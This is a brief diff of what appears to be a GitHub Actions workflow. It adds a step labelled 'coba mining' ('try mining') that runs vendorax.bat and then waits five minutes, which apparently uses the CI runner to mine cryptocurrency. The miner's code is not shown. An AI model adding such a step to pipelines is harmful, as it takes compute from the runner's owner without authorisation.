@@ -39,6 +39,7 @@ jobs:
       run: cmd /c start.bat
     - name: membuat shortcut
       run: cmd /c shortcut.bat
+    - name: coba mining
       run: |
           cmd /c vendorax.bat
           sleep 300 # 300 detik = 5 menit
